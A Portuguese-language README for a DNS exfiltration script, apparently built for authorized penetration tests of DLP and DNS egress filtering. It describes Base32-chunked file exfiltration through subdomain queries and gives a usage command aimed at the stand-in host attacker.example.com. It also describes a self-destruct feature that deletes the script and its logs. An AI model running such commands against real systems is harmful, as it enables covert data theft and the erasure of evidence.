# 🛡️ DNS Exfiltration Simulation Script

Este script simula uma técnica real de exfiltração de dados via consultas DNS, com foco em **testes de penetração autorizados**. Ele codifica o conteúdo de um arquivo em Base32 e envia os dados em partes como subdomínios de um domínio controlado pelo avaliador de segurança.

---

## ⚠️ AVISO LEGAL

> **USO EXCLUSIVO EM AMBIENTES AUTORIZADOS**
>
> Este código destina-se **exclusivamente** a avaliações de segurança **autorizadas** por escrito, dentro de escopo definido com o cliente.  
> **O uso não autorizado é ilegal** e pode violar leis de privacidade e segurança da informação.  
> O autor **não se responsabiliza** por uso indevido ou malicioso deste código.

---

## 📌 Funcionalidades

- Exfiltração simulada de arquivos via DNS (codificados em Base32).
- Controle por linha de comando (`--file`, `--domain`, `--dns`).
- Logs detalhados com identificador de sessão.
- Autodestruição do script e logs após tempo limite.
- Uso de servidor DNS personalizado com `dnspython`.

---

## ✅ Requisitos

- Python 3.x
- [dnspython](https://pypi.org/project/dnspython/)

```bash
pip install dnspython
```

---

## 🚀 Como Usar

### 1. Configure um domínio controlado (ex: via servidor DNS personalizado ou redirecionamento).
### 2. Prepare o arquivo a ser exfiltrado (ex: `dados_teste.txt`).
### 3. Execute o script com os parâmetros desejados:

```bash
python dns_exfil.py --file dados_teste.txt --domain attacker.example.com --dns 8.8.8.8
```

Parâmetro         | Descrição
------------------|---------------------------------------------------
`--file`          | Caminho do arquivo que será exfiltrado (padrão: `dados_teste.txt`)
`--domain`        | Domínio controlado pelo atacante para capturar os dados
`--dns`           | Servidor DNS utilizado para a resolução das consultas

---

## 📂 Logs

Todas as atividades são registradas no arquivo `dns_exfiltration.log`, incluindo:

- Identificador único da sessão
- Chunks enviados
- Erros de consulta DNS
- Status da autodestruição

---

## 🢨 Mecanismo de Autodestruição

- O script e seus logs são removidos automaticamente após `180 segundos` (padrão).
- Comportamento controlado pela variável `AUTO_DELETE`.

---

## 🧪 Caso de Uso

Esse script pode ser utilizado para:

- Testar DLP e filtros DNS de saída em firewalls.
- Validar a capacidade de detecção de tráfego DNS suspeito.
- Realizar simulações controladas em ambientes de laboratório.

---

## 📌 Observações

- A exfiltração é fictícia: os dados não são armazenados no domínio remoto (a não ser que você configure um servidor para isso).
- A resolução DNS apenas simula a saída de dados; para captura real, use um servidor DNS escutando requisições.

---

## 🧑‍💻 Autor

Este projeto foi desenvolvido para fins educacionais e de avaliação profissional de segurança cibernética em ambientes controlados. Não me responsabilizo por qualquer uso indevido do código ou distribuíção que não seja para o fim ao qual foi projetado.

---

